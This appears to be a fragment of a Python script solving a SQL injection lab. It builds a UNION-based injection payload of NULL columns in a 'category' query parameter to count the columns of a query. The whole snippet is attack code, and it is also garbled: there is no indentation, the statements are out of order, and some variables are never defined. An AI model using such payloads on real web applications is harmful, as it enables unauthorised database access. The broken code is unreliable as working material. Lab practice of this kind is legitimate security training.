def sqli_union_1_lab(response):...
while not response.ok:
null.pop(-1)
print(f"There are {null.count('NULL')} columns")
null.extend([',', 'NULL', '--'])
return null
sqli['category'] = f"Lifestyle{' '.join(null)}"
response = api_session.get(url, params=sqli)
